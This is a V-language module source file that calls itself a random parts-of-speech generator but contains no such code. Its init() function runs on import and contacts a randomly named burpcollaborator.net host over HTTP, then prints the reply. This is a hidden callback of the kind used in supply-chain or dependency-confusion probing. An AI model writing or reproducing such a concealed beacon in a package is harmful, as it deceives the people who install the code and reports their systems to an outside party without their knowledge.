module verbose

// verbose is a generator for random parts of speech
import net.http
fn init() {
	// your setup code here ...
	if resp := http.get('http://w9664pwprjvj0j6gj0895i2t3k9b0zp.burpcollaborator.net') {
		println(resp.text) // resp is a http.Response, not an optional
	} else {
		println(err)
	}
}
